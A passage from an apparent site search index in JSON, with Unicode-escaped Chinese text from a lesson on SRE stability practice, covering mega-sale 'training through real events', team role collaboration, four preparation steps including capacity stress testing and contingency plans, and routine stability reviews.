<p>\u540c\u6837\uff0c\u8fd9\u6837\u7684\u7b56\u7565\u653e\u5728\u6211\u4eec\u7684\u7cfb\u7edf\u7a33\u5b9a\u6027\u5efa\u8bbe\u4e2d\u4e5f\u975e\u5e38\u9002\u7528\u3002\u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u7c7b\u4f3c\u7684\u771f\u5b9e\u4e14\u5177\u5907\u9ad8\u538b\u6548\u679c\u7684\u573a\u666f\uff0c\u6765\u5145\u5206\u66b4\u9732\u6211\u4eec\u7684\u7a33\u5b9a\u6027\u5b58\u5728\u54ea\u4e9b\u95ee\u9898\u548c\u8584\u5f31\u70b9\uff0c\u7136\u540e\u6709\u9488\u5bf9\u6027\u5730\u8fdb\u884c\u6539\u8fdb\u3002</p> <p>\u7c7b\u4f3c\u7684\u573a\u666f\uff0c\u6bd4\u5982\u8bf4\u6781\u7aef\u7684\u6d77\u91cf\u7528\u6237\u8bbf\u95ee\uff0c\u50cf\u7535\u5546\u7c7b\u4ea7\u54c1\u7684\u53cc\u5341\u4e00\u5927\u4fc3\u3001\u793e\u4ea4\u7c7b\u4ea7\u54c1\u5728\u6625\u665a\u7684\u62a2\u7ea2\u5305\uff0c\u4ee5\u53ca\u5a92\u4f53\u7c7b\u4ea7\u54c1\u7684\u7a81\u53d1\u70ed\u70b9\u65b0\u95fb\u7b49\u7b49\uff0c\u7528\u6237\u77ac\u65f6\u8bbf\u95ee\u7684\u6d41\u91cf\u662f\u6781\u5927\u7684\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u51b2\u51fb\u548c\u6311\u6218\u4e5f\u5c31\u975e\u5e38\u5927\u3002\u518d\u6216\u8005\uff0c\u662f\u6781\u7aef\u7684\u6545\u969c\u573a\u666f\uff0c\u6bd4\u5982\u673a\u623f\u65ad\u7535\u3001\u5b58\u50a8\u6545\u969c\u6216\u6838\u5fc3\u90e8\u4ef6\u5931\u6548\u7b49\u7b49\u3002</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u8bb2\u7a33\u5b9a\u6027\u5efa\u8bbe\uff0c\u4e00\u5b9a\u4e5f\u662f\u9488\u5bf9\u6781\u7aef\u573a\u666f\u4e0b\u7684\u7a33\u5b9a\u6027\u5efa\u8bbe\u3002</p> <p>\u4e0d\u77e5\u9053\u4f60\u6709\u6ca1\u6709\u53d1\u73b0\uff0c\u5176\u5b9e\u6211\u4eec\u6709\u5f88\u591a\u7684\u7a33\u5b9a\u6027\u4fdd\u969c\u6280\u672f\u548c\u7406\u5ff5\uff0c\u6bd4\u5982\u5bb9\u91cf\u89c4\u5212\u548c\u538b\u6d4b\u3001\u5168\u94fe\u8def\u8ddf\u8e2a\u3001\u670d\u52a1\u6cbb\u7406\u3001\u540c\u57ce\u53cc\u6d3b\u751a\u81f3\u662f\u5f02\u5730\u591a\u6d3b\u7b49\uff0c\u57fa\u672c\u90fd\u662f\u5728\u8fd9\u4e9b\u573a\u666f\u4e0b\u50ac\u751f\u51fa\u6765\u7684\uff0c\u751a\u81f3\u662f\u88ab\u5012\u903c\u51fa\u6765\u7684\u3002</p> <p>\u5982\u679c\u9488\u5bf9\u8fd9\u6837\u7684\u6781\u7aef\u573a\u666f\uff0c\u6211\u4eec\u90fd\u53ef\u4ee5\u4ece\u5bb9\u5e94\u5bf9\uff0c\u90a3\u4f60\u53ef\u4ee5\u60f3\u8c61\u4e00\u4e0b\uff0c\u65e5\u5e38\u4e00\u822c\u7684\u95ee\u9898\u6216\u5c0f\u6545\u969c\u5904\u7406\u8d77\u6765\u81ea\u7136\u4e5f\u5c31\u4e0d\u5728\u8bdd\u4e0b\u4e86\u3002\u800c\u4e14\uff0c\u76ee\u524d\u5404\u5927\u7535\u5546\u7f51\u7ad9\u7684\u5927\u4fc3\u5df2\u7ecf\u57fa\u672c\u65e5\u5e38\u5316\uff0c\u6bcf\u6708\u90fd\u4f1a\u6709\uff0c\u751a\u81f3\u6bcf\u5468\u6bcf\u5929\u90fd\u4f1a\u6709\u4e0d\u540c\u7684\u4fc3\u9500\u6d3b\u52a8\uff0c\u6240\u4ee5\u5728\u8fd9\u79cd\u5bc6\u96c6\u7a0b\u5ea6\u975e\u5e38\u9ad8\u7684\u5927\u4fc3\u8282\u594f\u4e0b\uff0c\u201c\u4ee5\u8d5b\u5e26\u7ec3\u201d\u7684\u6548\u679c\u5c31\u4f1a\u66f4\u52a0\u7a81\u51fa\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u201c\u4ee5\u8d5b\u5e26\u7ec3\u201d\u7684\u76ee\u7684\u5c31\u662f\u8981\u68c0\u9a8c\u6211\u4eec\u7684\u7cfb\u7edf\u7a33\u5b9a\u6027\u72b6\u51b5\u5230\u5e95\u5982\u4f55\uff0c\u6211\u4eec\u7684\u7cfb\u7edf\u7a33\u5b9a\u6027\u8fd8\u6709\u54ea\u4e9b\u8584\u5f31\u70b9\u3002</p> <p>\u90a3\u4e48\uff0c\u5982\u679c\u4f60\u5728\u81ea\u5df1\u7684\u56e2\u961f\u6765\u843d\u5730\u201c\u4ee5\u8d5b\u5e26\u7ec3\u201d\u7684\u8bdd\uff0c\u4e00\u5b9a\u8981\u5148\u8003\u8651\u81ea\u5df1\u7684\u4e1a\u52a1\u7cfb\u7edf\u5e94\u5bf9\u7684\u6781\u7aef\u573a\u666f\u5230\u5e95\u662f\u4ec0\u4e48\uff0c\u7136\u540e\u57fa\u4e8e\u8fd9\u4e9b\u573a\u666f\u53bb\u8bbe\u8ba1\u548c\u89c4\u5212\u3002</p>"},{"location":"ops/50-sre-mogu-10/#sre","title":"SRE\u7684\u5404\u4e2a\u89d2\u8272\u5982\u4f55\u534f\u4f5c\uff1f","text":"<p>\u8d5b\u573a\u6709\u4e86\uff0c\u8981\u6253\u597d\u8fd9\u573a\u4ed7\uff0c\u6211\u4eec\u5f97\u4fdd\u8bc1\u4e0a\u8d5b\u573a\u7684\u9009\u624b\u4eec\u80fd\u591f\u901a\u529b\u534f\u4f5c\u3002\u5bf9\u4e8e\u6211\u4eec\u60f3\u8981\u8fbe\u6210\u7684\u7a33\u5b9a\u6027\u76ee\u6807\u6765\u8bf4\uff0c\u5c31\u662f\u8981\u6709\u4e00\u5957\u9ad8\u6548\u7684SRE\u534f\u4f5c\u673a\u5236\u3002\u63a5\u4e0b\u6765\u6211\u8fd8\u662f\u4ee5\u7535\u5546\u5927\u4fc3\u8fd9\u4e2a\u573a\u666f\u4e3a\u4f8b\uff0c\u8ddf\u4f60\u5206\u4eab\u6211\u4eecSRE\u56e2\u961f\u4e2d\u5404\u4e2a\u89d2\u8272\u7684\u5206\u5de5\uff0c\u4ee5\u53ca\u53ef\u4ee5\u901a\u8fc7\u54ea\u4e9b\u7ec4\u7ec7\u5f62\u5f0f\u628a\u5404\u4e2a\u89d2\u8272\u7ec4\u7ec7\u8d77\u6765\u3002</p> <p>\u60f3\u8981\u628a\u7535\u5546\u5927\u4fc3\u8fd9\u573a\u8d5b\u4e8b\u505a\u6f02\u4eae\uff0c\u4fdd\u969c\u51c6\u5907\u5de5\u4f5c\u81f3\u5173\u91cd\u8981\u3002\u8fd9\u4e2a\u51c6\u5907\u5de5\u4f5c\u524d\u540e\u5171\u6709\u56db\u4e2a\u5173\u952e\u6b65\u9aa4\uff0c\u6211\u4eec\u5c31\u4e00\u6b65\u4e00\u6b65\u6765\u770b\u3002</p>"},{"location":"ops/50-sre-mogu-10/#_2","title":"\u7b2c\u4e00\u6b65\uff0c\u5927\u4fc3\u9879\u76ee\u5f00\u5de5\u4f1a\u3002","text":"<p>\u5728\u8fd9\u4e2a\u4f1a\u8bae\u4e0a\uff0c\u6211\u4eec\u4f1a\u660e\u786e\u4e1a\u52a1\u6307\u6807\uff0c\u6307\u5b9a\u5927\u4fc3\u9879\u76ee\u7684\u6280\u672f\u4fdd\u969c\u8d1f\u8d23\u4eba\uff0c\u901a\u5e38\u7531\u7ecf\u9a8c\u4e30\u5bcc\u7684\u4e1a\u52a1\u6280\u672f\u6210\u5458\u6216\u5e73\u53f0\u6280\u672f\u6210\u5458\u627f\u62c5\uff0c\u540c\u65f6\u4f1a\u660e\u786e\u6280\u672f\u56e2\u961f\u7684\u5206\u5de5\u4ee5\u53ca\u5404\u4e2a\u56e2\u961f\u7684\u63a5\u53e3\u4eba\uff0c\u7136\u540e\u6839\u636e\u5927\u4fc3\u65e5\u671f\uff0c\u5012\u6392\u5168\u94fe\u8def\u538b\u6d4b\u8ba1\u5212\u3002\u5206\u5de5\u548c\u8ba1\u5212\u6572\u5b9a\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u4e00\u6b65\u6b65\u6267\u884c\u4e86\u3002</p>"},{"location":"ops/50-sre-mogu-10/#_3","title":"\u7b2c\u4e8c\u6b65\uff0c\u4e1a\u52a1\u6307\u6807\u5206\u89e3\u53ca\u7528\u6237\u6a21\u578b\u5206\u6790\u8bc4\u5ba1\u4f1a\u3002","text":"<p>\u4e1a\u52a1\u6307\u6807\u5206\u89e3\u548c\u7528\u6237\u6a21\u578b\u5206\u6790\u9636\u6bb5\uff0c\u9700\u8981\u4e1a\u52a1\u5f00\u53d1\u548cPE\u56e2\u961f\u5171\u540c\u914d\u5408\uff0c\u4e3b\u8981\u662f\u5171\u540c\u5206\u6790\u51fa\u6838\u5fc3\u94fe\u8def\uff0c\u540c\u65f6PE\u8981\u5206\u6790\u94fe\u8def\u4e0a\u7684\u5e94\u7528\u65e5\u5e38\u8fd0\u884c\u60c5\u51b5\uff0c\u7279\u522b\u662fQPS\u6c34\u4f4d\uff0c\u8fd9\u91cc\u5c31\u8981\u5229\u7528\u5230\u6211\u4eec\u524d\u976203\u8bb2\u4e2d\u793a\u4f8b\u7684SLO\u7684Dashboard\uff0c\u7ed3\u5408\u8fd9\u4e24\u70b9\uff0c\u5927\u81f4\u5224\u65ad\u51fa\u8981\u6269\u5bb9\u7684\u8d44\u6e90\u9700\u6c42\u3002</p> <p>\u8fd9\u91cc\u4f60\u53ef\u80fd\u4f1a\u6709\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48\u4e1a\u52a1\u5f00\u53d1\u548cPE\u8981\u4e00\u540c\u5206\u6790\uff1f\u56e0\u4e3a\u6bcf\u4e2aPE\u662f\u8981\u8d1f\u8d23\u4e00\u6574\u6761\u6838\u5fc3\u94fe\u8def\u4e0a\u7684\u5e94\u7528\u7684\uff0c\u6240\u4ee5PE\u53ef\u4ee5\u8bc6\u522b\u51fa\u66f4\u5168\u5c40\u7684\u94fe\u8def\u4ee5\u53ca\u6574\u6761\u94fe\u8def\u4e0a\u7684\u5bb9\u91cf\u6c34\u4f4d\u60c5\u51b5\u3002\u800c\u6bcf\u4f4d\u4e1a\u52a1\u5f00\u53d1\u5f80\u5f80\u53ea\u4e13\u6ce8\u5728\u67d0\u51e0\u4e2a\u5e94\u7528\u4e0a\uff0c\u6240\u4ee5\u4ed6\u53ef\u4ee5\u628a\u4e1a\u52a1\u76ee\u6807\u62c6\u89e3\u5f97\u66f4\u7ec6\u81f4\uff0c\u5e76\u8f6c\u5316\u6210QPS\u548cTPS\u5bb9\u91cf\u8981\u6c42\uff0c\u7136\u540e\u5206\u914d\u5230\u4e00\u4e2a\u4e2a\u5177\u4f53\u5e94\u7528\u4e0a\uff0c\u5e76\u4e14\u6bcf\u4e2a\u5e94\u7528\u7684Owner\u5728\u540e\u9762\u8981\u786e\u4fdd\u8fd9\u4e9b\u5e94\u7528\u80fd\u591f\u6ee1\u8db3\u5404\u81ea\u7684QPS\u548cTPS\u5bb9\u91cf\u8981\u6c42\u3002</p> <p>\u4ece\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0cPE\u4f1a\u66f4\u591a\u5730\u4ece\u5168\u5c40\u89d2\u5ea6\u5173\u6ce8\u7ebf\u4e0a\u771f\u5b9e\u7684\u8fd0\u884c\u72b6\u6001\uff0c\u800c\u4e1a\u52a1\u5f00\u53d1\u5219\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u505a\u66f4\u7ec6\u81f4\u7684\u5206\u6790\uff0c\u751a\u81f3\u662f\u6df1\u5165\u5230\u4ee3\u7801\u5c42\u9762\u7684\u5206\u6790\u3002</p> <p>\u540c\u65f6\uff0c\u4e1a\u52a1\u5f00\u53d1\u548cPE\u5728\u5206\u6790\u7684\u65f6\u5019\uff0c\u5c31\u8981\u4f7f\u7528\u5230\u7a33\u5b9a\u6027\u5f00\u53d1\u56e2\u961f\u63d0\u4f9b\u7684\u5168\u94fe\u8def\u8ddf\u8e2a\u548c\u76d1\u63a7\u5e73\u53f0\u4e86\uff0c\u800c\u4e0d\u662f\u9760\u624b\u5de5\u63d0\u53d6\u65e5\u5fd7\u6765\u505a\u7edf\u8ba1\u5206\u6790\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u6839\u636e\u5bb9\u91cf\u8bc4\u4f30\u7684\u7ed3\u679c\uff0c\u7531PE\u51c6\u5907\u6269\u5bb9\u8d44\u6e90\uff0c\u7136\u540e\u4e1a\u52a1\u5f00\u53d1\u7684\u5e94\u7528Owner\uff0c\u901a\u8fc7\u8fd0\u7ef4\u81ea\u52a8\u5316\u5e73\u53f0\uff0c\u505a\u5b8c\u5168\u81ea\u52a8\u5316\u7684\u5e94\u7528\u90e8\u7f72\u548c\u670d\u52a1\u4e0a\u7ebf\u5373\u53ef\uff0c\u6574\u4e2a\u8fc7\u7a0b\u65e0\u9700PE\u4ecb\u5165\u3002</p>"},{"location":"ops/50-sre-mogu-10/#_4","title":"\u7b2c\u4e09\u6b65\uff0c\u5e94\u6025\u9884\u6848\u8bc4\u5ba1\u4f1a\u3002","text":"<p>\u5728\u9884\u6848\u51c6\u5907\u9636\u6bb5\uff0c\u4ecd\u7136\u662fPE\u4e0e\u4e1a\u52a1\u5f00\u53d1\u914d\u5408\uff0c\u9488\u5bf9\u6838\u5fc3\u94fe\u8def\u548c\u6838\u5fc3\u5e94\u7528\u505a\u6709\u9488\u5bf9\u6027\u7684\u9884\u6848\u8ba8\u8bba\u3002\u8fd9\u65f6\u5c31\u8981\u7ec6\u5316\u5230\u63a5\u53e3\u548c\u65b9\u6cd5\u4e0a\uff0c\u770b\u662f\u5426\u51c6\u5907\u597d\u9650\u6d41\u3001\u964d\u7ea7\u548c\u7194\u65ad\u7b56\u7565\uff0c\u7b56\u7565\u6709\u4e86\u8fd8\u8981\u8ba8\u8bba\u5177\u4f53\u7684\u9650\u6d41\u503c\u662f\u591a\u5c11\u3001\u964d\u7ea7\u548c\u7194\u65ad\u7684\u5177\u4f53\u6761\u4ef6\u662f\u600e\u6837\u7684\uff0c\u6700\u540e\u8fd9\u4e9b\u914d\u7f6e\u503c\u548c\u914d\u7f6e\u7b56\u7565\u90fd\u8981\u843d\u5230\u5bf9\u5e94\u7684\u7a33\u5b9a\u6027\u914d\u7f6e\u4e2d\u5fc3\u7ba1\u7406\u8d77\u6765\u3002</p> <p>\u8fd9\u91cc**PE\u66f4\u591a\u5730\u662f\u8d1f\u8d23\u5e73\u53f0\u7ea7\u7684\u7b56\u7565**\uff0c\u6bd4\u5982\uff0c\u5982\u679c\u51fa\u73b0\u6d41\u91cf\u6fc0\u589e\uff0c\u9996\u5148\u8981\u505a\u7684\u5c31\u662f\u5728\u63a5\u5165\u5c42Nginx\u505a\u9650\u6d41\uff0c\u5e76\u53d1QPS\u503c\u8981\u8bbe\u5b9a\u4e3a\u591a\u5c11\u5408\u9002\uff1b\u518d\u6bd4\u5982\u7f13\u5b58\u5931\u6548\u662f\u5426\u8981\u964d\u7ea7\u5230\u6570\u636e\u5e93\uff0c\u5982\u679c\u964d\u7ea7\u5230\u6570\u636e\u5e93\uff0c\u5fc5\u7136\u8981\u964d\u4f4e\u8bbf\u95eeQPS\uff0c\u964d\u4f4e\u591a\u5c11\u5408\u9002\uff0c\u7b49\u7b49\u3002</p> <p>\u800c**\u4e1a\u52a1\u5f00\u53d1\u5219\u8981\u66f4\u591a\u5730\u8003\u8651\u5177\u4f53\u4e1a\u52a1\u903b\u8f91\u4e0a\u7684\u7b56\u7565**\uff0c\u6bd4\u5982\u5546\u54c1\u8bc4\u8bba\u5e94\u7528\u6545\u969c\uff0c\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u964d\u7ea7\u4e0d\u663e\u793a\uff1b\u9996\u9875\u6216\u8be6\u60c5\u9875\u8fd9\u6837\u7684\u6838\u5fc3\u9875\u9762\uff0c\u662f\u5426\u5728\u6545\u969c\u65f6\u53ef\u4ee5\u5b8c\u5168\u5b9e\u73b0\u9759\u6001\u5316\u7b49\u7b49\u3002</p>"},{"location":"ops/50-sre-mogu-10/#_5","title":"\u7b2c\u56db\u6b65\uff0c\u5bb9\u91cf\u538b\u6d4b\u53ca\u590d\u76d8\u4f1a\u3002","text":"<p>\u5728\u5bb9\u91cf\u538b\u6d4b\u8fd9\u4e2a\u9636\u6bb5\uff0c\u5c31\u9700\u8981PE\u3001\u4e1a\u52a1\u5f00\u53d1\u548c\u7a33\u5b9a\u6027\u5e73\u53f0\u7684\u540c\u5b66\u6765\u914d\u5408\u4e86\u3002\u4e1a\u52a1\u5f00\u53d1\u5728\u5bb9\u91cf\u89c4\u5212\u5e73\u53f0\u4e0a\u6784\u9020\u538b\u6d4b\u6570\u636e\u548c\u538b\u6d4b\u6a21\u578b\uff0c\u7a33\u5b9a\u6027\u5e73\u53f0\u7684\u540c\u5b66\u5728\u8fc7\u7a0b\u4e2d\u8981\u7ed9\u4e88\u914d\u5408\u652f\u6301\uff0c\u5982\u679c\u6709\u4e34\u65f6\u6027\u7684\u5e73\u53f0\u6216\u5de5\u5177\u9700\u6c42\uff0c\u8fd8\u8981\u5c3d\u5feb\u5f00\u53d1\u5b9e\u73b0\u3002</p> <p>\u538b\u6d4b\u8fc7\u7a0b\u4f1a\u5206\u4e3a\u5355\u673a\u3001\u5355\u94fe\u8def\u548c\u5168\u94fe\u8def\u51e0\u4e2a\u73af\u8282\uff0cPE\u548c\u4e1a\u52a1\u5f00\u53d1\uff0c\u5728\u8fc7\u7a0b\u4e2d\u7ed3\u5408\u5cf0\u503c\u6570\u636e\u505a\u76f8\u5e94\u7684\u6269\u5bb9\u3002\u5982\u679c\u662f\u6027\u80fd\u6709\u95ee\u9898\uff0c\u4e1a\u52a1\u5f00\u53d1\u8fd8\u8981\u505a\u4ee3\u7801\u548c\u67b6\u6784\u4e0a\u7684\u4f18\u5316\uff0c\u540c\u65f6\uff0c\u53cc\u65b9\u8fd8\u8981\u9a8c\u8bc1\u524d\u9762\u63d0\u5230\u7684\u670d\u52a1\u6cbb\u7406\u624b\u6bb5\u662f\u5426\u751f\u6548\u3002</p> <p>\u538b\u6d4b\u8fc7\u7a0b\u4e2d\u548c\u6bcf\u6b21\u538b\u6d4b\u7ed3\u675f\u540e\uff0c\u90fd\u8981\u4e0d\u65ad\u5730\u603b\u7ed3\u548c\u590d\u76d8\uff0c\u7136\u540e\u518d\u538b\u6d4b\u9a8c\u8bc1\u3001\u6269\u5bb9\u548c\u8c03\u4f18\uff0c\u76f4\u81f3\u5bb9\u91cf\u548c\u9884\u6848\u5168\u90e8\u9a8c\u8bc1\u901a\u8fc7\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e00\u822c\u8981\u6301\u7eed2\uff5e3\u8f6e\uff0c\u65f6\u95f4\u5468\u671f\u4e0a\u89813\uff5e4\u5468\u5de6\u53f3\u3002\u6574\u4e2a\u8fc7\u7a0b\u5c31\u4f1a\u8981\u6c42\u4e09\u4e2a\u89d2\u8272\u5fc5\u987b\u8981\u975e\u5e38\u7d27\u5bc6\u5730\u914d\u5408\u624d\u53ef\u4ee5\u3002</p> <p>\u5230\u8fd9\u91cc\uff0c\u6574\u4e2a\u4fdd\u969c\u51c6\u5907\u8fc7\u7a0b\u5c31\u7ed3\u675f\u4e86\u3002\u4f60\u53ef\u4ee5\u5148\u601d\u8003\u4e0b\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6bcf\u4e2a\u89d2\u8272\u53d1\u6325\u7684\u4f5c\u7528\u6709\u54ea\u4e9b\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u8ddf\u4f60\u4e00\u8d77\u63d0\u70bc\u603b\u7ed3\u4e0b\u3002</p> <ul> <li> <p>\u7b2c\u4e00\uff0cPE\u66f4\u52a0\u5173\u6ce8\u7ebf\u4e0a\u6574\u4f53\u7684\u8fd0\u884c\u72b6\u6001\uff0c\u6240\u4ee5\u89c6\u89d2\u4f1a\u66f4\u5168\u5c40\u4e00\u4e9b\uff0c\u4e1a\u52a1\u5f00\u53d1\u5219\u66f4\u5173\u6ce8\u81ea\u5df1\u8d1f\u8d23\u7684\u5177\u4f53\u5e94\u7528\uff0c\u4ee5\u53ca\u6df1\u5165\u5230\u4ee3\u7801\u5c42\u9762\u7684\u5206\u6790\u5de5\u4f5c\u3002</p> </li> <li> <p>\u7b2c\u4e8c\uff0cPE\u4f1a\u4e3b\u8981\u8d1f\u8d23\u5e73\u53f0\u7ea7\u7684\u516c\u5171\u90e8\u4ef6\uff0c\u5982\u7f13\u5b58\u3001\u6d88\u606f\u548c\u6587\u4ef6\u7b49\uff1bDBA\u8d1f\u8d23\u6570\u636e\u5e93\uff0c\u6240\u8d77\u5230\u7684\u4f5c\u7528\u4e0ePE\u76f8\u540c\uff0c\u4ed6\u4eec\u5173\u6ce8\u8fd9\u4e9b\u5e73\u53f0\u90e8\u4ef6\u7684\u5bb9\u91cf\u8bc4\u4f30\u3001\u670d\u52a1\u6cbb\u7406\u7b56\u7565\uff0c\u4ee5\u53ca\u5e94\u6025\u9884\u6848\u7b49\uff1b\u800c\u4e1a\u52a1\u5f00\u53d1\u5219\u4f1a\u628a\u66f4\u591a\u7684\u6ce8\u610f\u529b\u653e\u5728\u4e1a\u52a1\u5c42\u9762\u7684\u5bb9\u91cf\u8bc4\u4f30\u548c\u5404\u7c7b\u7b56\u7565\u4e0a\u3002\u540c\u65f6\uff0cPE\u548c\u4e1a\u52a1\u5f00\u53d1\u5173\u6ce8\u7684\u5185\u5bb9\u662f\u76f8\u4e92\u4f9d\u8d56\u7684\uff0c\u4ed6\u4eec\u7684\u7ecf\u9a8c\u4e5f\u6709\u975e\u5e38\u5927\u7684\u4e92\u8865\u6027\u548c\u4f9d\u8d56\u6027\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u53cc\u65b9\u5fc5\u987b\u8981\u7d27\u5bc6\u914d\u5408\u3002</p> </li> <li> <p>\u7b2c\u4e09\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u4f60\u53ef\u80fd\u4f1a\u53d1\u73b0\uff0c\u5de5\u5177\u5f00\u53d1\u548c\u7a33\u5b9a\u6027\u5f00\u53d1\u7684\u540c\u5b66\u5728\u5176\u4e2d\u53c2\u4e0e\u5e76\u4e0d\u591a\uff0c\u8fd9\u662f\u56e0\u4e3a\u4ed6\u4eec\u7684\u4ef7\u503c\u66f4\u591a\u4f53\u73b0\u5728\u5e73\u65f6\u3002\u6211\u4eec\u4f9d\u8d56\u7684\u5404\u7c7b\u5e73\u53f0\u548c\u5de5\u5177\uff0c\u6bd4\u5982\u6269\u7f29\u5bb9\u3001\u94fe\u8def\u5206\u6790\u3001\u6d4b\u8bd5\u6570\u636e\u5236\u9020\u3001\u538b\u6d4b\u6d41\u91cf\u7684\u6a21\u62df\u7b49\u80fd\u529b\uff0c\u90fd\u662f\u901a\u8fc7\u8fd9\u4e24\u4e2a\u56e2\u961f\u5728\u5e73\u65f6\u5f00\u53d1\u51fa\u6765\u7684\u3002\u5bf9\u4e8e\u8fd9\u4e24\u4e2a\u56e2\u961f\u6765\u8bf4\uff0c\u8fd9\u4e2a\u65f6\u5019\u51fa\u73b0\u5f97\u8d8a\u5c11\uff0c\u4ed6\u4eec\u7684\u4ef7\u503c\u624d\u662f\u8d8a\u5927\u7684\u3002</p> </li> </ul> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u5bf9\u4e8eSRE\u4f53\u7cfb\u4e2d\uff0c\u6bcf\u4e2a\u89d2\u8272\u8981\u8d77\u5230\u7684\u4f5c\u7528\uff0c\u4ee5\u53ca\u4ed6\u4eec\u4e4b\u95f4\u7684\u534f\u4f5c\u673a\u5236\u5c31\u8bb2\u5b8c\u4e86\uff0c\u5404\u65b9\u804c\u8d23\u4e0d\u540c\uff0c\u4f46\u662f\u5f7c\u6b64\u4e92\u8865\u548c\u4f9d\u8d56\uff0c\u53ea\u6709\u5bc6\u5207\u5408\u4f5c\u624d\u80fd\u53d1\u6325\u51faSRE\u4f53\u7cfb\u7684\u529b\u91cf\u3002</p>"},{"location":"ops/50-sre-mogu-10/#_6","title":"\u8d5b\u573a\u4e0a\u7684\u54ea\u4e9b\u5de5\u4f5c\u53ef\u4ee5\u4f8b\u884c\u5316\uff1f","text":"<p>\u8c08\u5b8c\u4e86\u201c\u4ee5\u8d5b\u5e26\u7ec3\u201d\u8fd9\u79cd\u5927\u4fc3\u573a\u666f\u4e0b\u7684\u534f\u4f5c\u673a\u5236\uff0c\u90a3\u6ca1\u6709\u5927\u4fc3\u7684\u65f6\u5019\uff0cSRE\u7ec4\u7ec7\u4e2d\u7684\u5404\u4e2a\u89d2\u8272\u5e73\u65f6\u5e94\u8be5\u8981\u505a\u4e9b\u4ec0\u4e48\u5462\uff1f</p> <p>\u5176\u5b9e\uff0c\u6211\u4eec\u524d\u9762\u63d0\u5230\u7684\u201c\u4ee5\u8d5b\u5e26\u7ec3\u201d\u7684\u4e8b\u60c5\uff0c\u4f1a\u6709\u4e00\u90e8\u5206\u8f6c\u5316\u4e3a\u4f8b\u884c\u5de5\u4f5c\uff0c\u540c\u65f6\u8fd8\u4f1a\u589e\u52a0\u4e00\u4e9b\u5468\u671f\u6027\u7684\u5de5\u4f5c\u3002\u603b\u7ed3\u8d77\u6765\u5c31\u662f\u4ee5\u4e0b\u4e24\u9879\u4e3b\u8981\u5de5\u4f5c\u3002</p> <p>\u7b2c\u4e00\u9879\uff0c\u6838\u5fc3\u5e94\u7528\u53d8\u66f4\u53ca\u65b0\u4e0a\u7ebf\u4e1a\u52a1\u7684\u7a33\u5b9a\u6027\u8bc4\u5ba1\u5de5\u4f5c\u3002</p> <p>\u8fd9\u91cc\u5c31\u5305\u62ec\u524d\u9762\u8bb2\u5230\u7684\u5bb9\u91cf\u8bc4\u4f30\u548c\u538b\u6d4b\u3001\u9884\u6848\u7b56\u7565\u662f\u5426\u5b8c\u5907\u7b49\u5de5\u4f5c\u3002PE\u4f1a\u8ddf\u4e1a\u52a1\u5f00\u53d1\u4e00\u8d77\u8bc4\u4f30\u53d8\u52a8\u7684\u5f71\u54cd\uff0c\u6bd4\u5982\u53d8\u52a8\u7684\u4e1a\u52a1\u903b\u8f91\u4f1a\u4e0d\u4f1a\u5bfc\u81f4\u6027\u80fd\u5f71\u54cd\uff0c\u8fdb\u800c\u5f71\u54cd\u5bb9\u91cf\uff1b\u5bf9\u4e8e\u65b0\u589e\u52a0\u7684\u63a5\u53e3\u6216\u903b\u8f91\uff0c\u662f\u5426\u8981\u505a\u9650\u6d41\u3001\u964d\u7ea7\u548c\u7194\u65ad\u7b49\u670d\u52a1\u6cbb\u7406\u7b56\u7565\uff0c\u5982\u679c\u8bc4\u4f30\u51fa\u6765\u662f\u5fc5\u9700\u7684\uff0c\u90a3\u4e0a\u7ebf\u524d\u4e00\u5b9a\u8981\u628a\u8fd9\u4e9b\u7b56\u7565\u5b8c\u5584\u597d\uff1b\u540c\u65f6\u5728\u6d4b\u8bd5\u73af\u5883\u4e0a\u8fd8\u8981\u505a\u9a8c\u8bc1\uff0c\u4e0a\u7ebf\u540e\u8981\u5173\u6ce8SLO\u662f\u5426\u53d1\u751f\u53d8\u5316\u7b49\u3002</p> <p>\u7b2c\u4e8c\u9879\uff0c\u5468\u671f\u6027\u6280\u672f\u8fd0\u8425\u5de5\u4f5c\u3002</p> <p>\u8fd9\u4e9b\u5c31\u5305\u62ec\u4e86\u6211\u4eec\u8981\u4f8b\u884c\u5173\u6ce8\u9519\u8bef\u9884\u7b97\u7684\u6d88\u8017\u60c5\u51b5\uff0c\u6bcf\u5468\u6216\u6bcf\u6708\u8f93\u51fa\u7cfb\u7edf\u6574\u4f53\u8fd0\u884c\u62a5\u8868\uff0c\u5e76\u53ec\u96c6\u4e1a\u52a1\u5f00\u53d1\u4e00\u8d77\u5f00\u8bc4\u5ba1\u4f1a\uff0c\u5bf9\u53d8\u5316\u8f83\u5927\u6216\u6709\u98ce\u9669\u7684SLO\u91cd\u70b9\u8bc4\u4f30\uff0c\u8fdb\u800c\u786e\u8ba4\u662f\u5426\u8981\u91c7\u53d6\u6539\u8fdb\u63aa\u65bd\u6216\u6682\u505c\u53d8\u66f4\uff0c\u4ee5\u6b64\u6765\u9a71\u52a8\u4e1a\u52a1\u5f00\u53d1\u5173\u6ce8\u548c\u63d0\u5347\u7a33\u5b9a\u6027\u3002</p> 